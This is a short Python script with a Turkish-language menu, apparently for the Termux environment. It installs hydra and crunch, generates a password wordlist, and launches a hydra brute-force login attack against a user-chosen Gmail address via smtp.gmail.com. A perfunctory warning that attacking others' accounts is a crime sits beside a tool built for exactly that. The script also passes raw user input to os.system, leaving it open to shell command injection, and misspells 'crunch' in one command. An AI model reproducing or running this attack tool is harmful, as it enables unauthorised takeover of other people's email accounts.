#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("pkg update")
os.system("pkg install figlet")
os.system("pkg install hydra")
os.system("pkg install crunch")
os.system("clear")
os.system("figlet cracker")
print("""
Bu Araç Gmail Hesaplarına Yönelik Kaba Kuvvet Saldırısı Düzenleyebilir. Başkalarının Hesaplarına Yönelik İşlem Yapmak Yasaktır ve Suçtur.

1) Wordlist Oluştur
2) Gmail Cracker

""")

secim=raw_input("Seçim : ")

if(secim=="1"):
	minimum = raw_input("Minimum Karakter Sayısı : ")
	maksimum = raw_input("Maksimum Karakter Sayısı : ")
	kullanilan = raw_input("Kullanılacak Karakterler : ")
	os.system("crucnh " + minimum + " " + maksimum + " " + kullanilan + " -o parola_listesi.txt")
	
elif(secim=="2"):
	hedef = raw_input("Hedef Gmail : ")
	parola = raw_input("Parola Listesi : ")
	os.system("hydra -S -v -V -s 465 -l " + hedef + " -P " + parola + " smtp.gmail.com smtp")